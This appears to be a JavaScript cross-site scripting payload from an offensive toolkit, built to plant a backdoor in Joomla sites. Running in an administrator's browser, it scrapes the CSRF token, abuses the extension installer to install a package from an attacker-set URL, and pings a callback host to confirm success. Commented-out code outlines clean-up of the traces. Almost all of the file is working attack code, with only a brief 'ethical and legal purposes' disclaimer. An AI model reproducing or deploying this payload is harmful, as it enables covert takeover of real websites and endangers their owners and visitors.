/*
Title: Joomla Core Payload (Plugin/Backdoor)
Author: Hans-Michael Varbaek
Company: VarBITS

Version: 2.75

Changelog:
- Ver 2.75 : First release. Injects a backdoor automatically.

Special Credits: Gökmen Güreçi and Muhammet Dilmaç (Version 2.75)

For ethical and legal purposes only. This script is provided as is and without warranty.

TODO:
- For pre-existing forms, consider using FormData to read and update/set new values in the future:
https://developer.mozilla.org/en-US/docs/Web/API/FormData/Using_FormData_Objects
https://developer.mozilla.org/en-US/docs/Web/API/FormData
https://developer.mozilla.org/en-US/docs/Web/API/FormData/set
-- Update this payload, or add a new payload that uses FormData() and XMLHttpRequest()
*/

var request = new XMLHttpRequest(); // Initial request to get CSRF token
var req = new XMLHttpRequest(); // Subsequent request to inject backdoor
var id = '';
var boundary = Math.random().toString().substr(2);
var space = "-----------------------------";

request.open('GET', 'index.php?option=com_installer&view=install', true);
request.onload = function() {
    if (request.status >= 200 && request.status < 400) {
        var resp = request.responseText;
        var myRegex = /<input type="hidden" name="([a-z0-9]+)" value="1" \/>/;
        id = myRegex.exec(resp)[1];
        req.open('POST', 'index.php?option=com_installer&view=install', true);
        req.setRequestHeader("content-type", "multipart/form-data; boundary=---------------------------" + boundary);
        var multipart = space + boundary +
            "\r\nContent-Disposition: form-data; name=\"install_package\"; filename=\"\"" +
            "\r\nContent-Type: application/octet-stream\r\n\r\n\r\n" +
            space + boundary +
            "\r\nContent-Disposition: form-data; name=\"install_directory\"" +
            "\r\n\r\n/var/www/html/tmp\r\n" +
            space + boundary +
            "\r\nContent-Disposition: form-data; name=\"install_url\"" +
            "\r\n\r\nVAR_BACKDOOR_URL\r\n" +
            space + boundary +
            "\r\nContent-Disposition: form-data; name=\"type\"" +
            "\r\n\r\n\r\n" +
            space + boundary +
            "\r\nContent-Disposition: form-data; name=\"installtype\"" +
            "\r\n\r\nurl\r\n" +
            space + boundary +
            "\r\nContent-Disposition: form-data; name=\"task\"" +
            "\r\n\r\ninstall.install\r\n" +
            space + boundary +
            "\r\nContent-Disposition: form-data; name=\"" + id + "\"" +
            "\r\n\r\n1\r\n" +
            space + boundary + "--\r\n";
        req.send(multipart);
    }
};

request.send();

// Callback Notification
var request2 = new XMLHttpRequest(); // Initiate XMLHttpRequest
request2.open("GET", "http://CALLBACKHOST:CALLBACKPORT/js_shell_notify.txt");
// Method and URL to send the request to - Hostname and port are set by: xsser.py
request2.send(); // Send the request

// TODO: Fix this in a later version
// Confirmed working manually in Chrome. For some reason, it does not work when executed as a script.
/*
Maybe we need to introduce a delay?
Maybe we have to specify top.document?

    setTimeout(function() {
        clean_up();
    }, 2000);

checkboxes = document.getElementsByName('cid[]');
for(var i=0, n=checkboxes.length;i<n;i++) {
    checkboxes[i].checked = true;
}
Joomla.submitbutton('delete_all');
*/
